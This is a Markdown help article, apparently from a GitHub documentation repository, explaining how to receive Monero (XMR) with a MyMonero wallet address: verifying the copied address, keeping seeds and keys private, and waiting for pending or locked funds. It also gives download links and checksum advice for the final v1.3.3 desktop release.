<p align="center"><img src="https://github.com/monero-projects/learn/raw/HEAD/assets/banner-article.png" alt="MyMonero article banner" width="100%"></p>

<h1 align="center">Receive XMR With a MyMonero Address</h1>
<p align="center">Find and share a receiving address safely, and confirm the incoming transaction.</p>

<p align="center">
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |

All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

## Short answer
To receive XMR, copy the receiving address from the wallet you intend to use and share only that address with the sender. Verify it before sending, and never provide your recovery seed or private keys to receive a payment.

## You'll see this if
- Someone is about to send you XMR and asks for a destination.
- You are unsure which wallet address to provide.
- You received XMR but the transaction has not appeared yet.
- You want to use MyMonero desktop after the hosted web wallet stopped.

## Why it happens
A receiving address directs a payment to a wallet; it is not the same thing as the seed that restores control of that wallet. Keep the distinction clear: a sender needs the correct receiving address, while nobody legitimate needs your seed, private keys, or password. If you provide the wrong address, the funds may not reach the wallet you intended, so verify what you share.

The incoming payment may not appear immediately. The wallet must scan activity, and a recent transaction can be pending or locked before it becomes spendable. A restored wallet may need an earlier restore height to scan older activity; earlier is safer when uncertain but slower. See [MyMonero transaction not showing](./mymonero-transaction-not-showing.md), [locked and pending balances](./mymonero-locked-pending-balance.md), and [restore height explained](./mymonero-restore-height-explained.md).

MyMonero desktop's final release is v1.3.3, available as Windows .exe, macOS .dmg, and Linux .zip from GitHub. The old app still opens wallets and sends XMR but is no longer maintained; no new features or security updates are provided. MyMonero hosted servers and web wallet login stopped. You may continue using desktop or restore in Cake Wallet, available on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. See [MyMonero migration options](./mymonero-to-cake-wallet-migration.md).

---
## Fix
1. **Open the wallet you intend to receive into.** Confirm its name and, if relevant, compare its address with your own private records. Similar wallet labels can be confusing. If you need to recover it, see [restore a MyMonero wallet](./restore-mymonero-wallet.md) and keep the seed private.
2. **Find its receive address.** Use the wallet's receive or address display. Copy the address using the wallet's controls when available. Do not use an address from an old message unless you have verified it is the address for the intended wallet.
3. **Verify the copied value.** Compare the pasted address with the one displayed in the wallet, including its beginning and ending characters. Malware or other unwanted software can alter clipboard contents, so stop if the values do not match. Do not share screenshots that expose private wallet details.
4. **Send only the address to the payer.** Use a communication channel you trust and make clear that the payment is XMR. Never send recovery words, private keys, login credentials, or a wallet file. Nobody legitimate needs them to make a payment.
5. **Ask the sender to verify before submitting.** The sender should confirm the address and asset in their own wallet or service. If the transfer comes from an exchange, they should follow that exchange's current withdrawal requirements. A payment from an exchange may have processing steps separate from the wallet.
6. **Wait for the wallet to scan.** Keep MyMonero open and allow activity to update. If the wallet appears stale, check [MyMonero not syncing](./mymonero-not-syncing.md). Error 523 is general guidance that a server connection is unavailable, not proof of a problem with your address.
7. **Check incoming status and available amount.** Review transaction history after scanning. Funds may be pending or locked and not yet spendable. Check [why MyMonero spendable balance is low](./mymonero-spendable-balance-low.md) if the received amount cannot immediately be sent onward.
8. **Record the payment privately.** Keep the amount, date, and transaction details in a secure place if needed. Avoid posting transaction identifiers with personal details or exposing wallet information publicly.

> [!WARNING]
> A receiving address is not a recovery seed. Never enter your seed into a web page or send it to a payer, exchange, or support contact. Nobody legitimate should ask for it.

---
## If that did not work
If no transaction appears, confirm that the sender submitted the transfer and used the exact address you provided. Then allow the wallet scan to update. For a restored wallet, check that you selected the correct seed format and an appropriate restore height. MyMonero seeds may be 13-word MyMonero-specific legacy seeds or 25-word standard Monero seeds; see [seed format differences](./mymonero-seed-13-vs-25-words.md).

If the wallet's total balance changes but the amount available does not, allow pending or locked funds to update. For exchange withdrawals, the exchange's transaction status and MyMonero's wallet display are separate. Do not request a second payment until you understand the first transfer's status.

The old MyMonero web wallet login has stopped. Avoid sites claiming to offer a replacement receive page that asks for your seed. The desktop app remains available as a final release but is no longer maintained. Official details are on the MyMonero desktop project. If you choose Cake Wallet instead, use its genuine app and confirm its current restore support.

## Prevention
- Select the intended wallet and verify its receive address each time you share it.
- Share the address only; keep your seed, keys, and password private.
- Ask senders to confirm XMR and check the destination before they submit.
- Allow scanning to complete before concluding that a payment is missing.
- Record relevant wallet and restore details privately, never together with a public seed.
- Ignore unsolicited recovery or support offers that ask for secret information.

## FAQ
<details><summary>Is it safe to share a receiving address?</summary>

A receiving address is used to direct a payment. Share only the address needed for the transfer, and keep your seed and private keys secret.

</details>

<details><summary>Why has my incoming XMR not appeared?</summary>

The sender may not have submitted it, the wallet may still be scanning, or the wallet may be different from the one expected. Confirm address and status first.

</details>

<details><summary>Can I spend the funds as soon as the address receives them?</summary>

Not necessarily. Incoming funds can be pending or locked before they become spendable. Check the wallet's current status.

</details>

<details><summary>Does MyMonero web login still work?</summary>

MyMonero hosted servers and web wallet login stopped. The final desktop release can still open wallets and send XMR, or you can consider restoring in Cake Wallet.

</details>

---

## Download MyMonero

- Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
- macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
- Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)

Check each file against the checksums on the [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [Install MyMonero on Windows](./install-mymonero-windows.md) | Get the final desktop release from the official project page and check the file before opening it. |
| [Install MyMonero on macOS](./install-mymonero-macos.md) | Download the final desktop release from GitHub, verify its SHA-256 value, and open it safely. |
| [Install MyMonero on Linux](./install-mymonero-linux.md) | Get the final Linux desktop release and open it with care. |

[Back to all MyMonero guides](https://github.com/monero-projects/learn)
